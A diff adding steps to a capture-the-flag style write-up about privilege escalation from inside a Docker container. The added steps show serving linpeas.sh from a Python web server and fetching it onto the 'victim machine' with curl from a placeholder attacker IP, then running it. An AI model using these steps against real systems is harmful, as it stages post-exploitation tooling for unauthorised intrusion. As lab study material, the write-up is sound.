@@ -41,6 +41,13 @@ Cgroups are used by containerization software such as LXC or Docker. Let's look 
 
 ## linpeas
 
-- Transfer [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to the Victime Machie.
-- 
+- Transfer [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to the Victim Machine. Host the file in a python webserver by doing `python3 -m http.server 80` and then download the file in the remote machine with curl `curl [http://Attack_IP/linpeas.sh](http://Attack_IP/linpeas.sh) -output <remote_location_to_save>`
+- Run linpeas.
+
+	![[Task - 15 Docker? I hardly even know her!-20240909133501872.webp]]
+	![[Task - 15 Docker? I hardly even know her!-20240909133807008.webp]]
+
+	You'll get a very important information at the beginning. It says we are inside a Docker environment. So that means we are not actually in the `.33` machine, we got the shell in a container that is running inside `.33` machine.
+
+
 
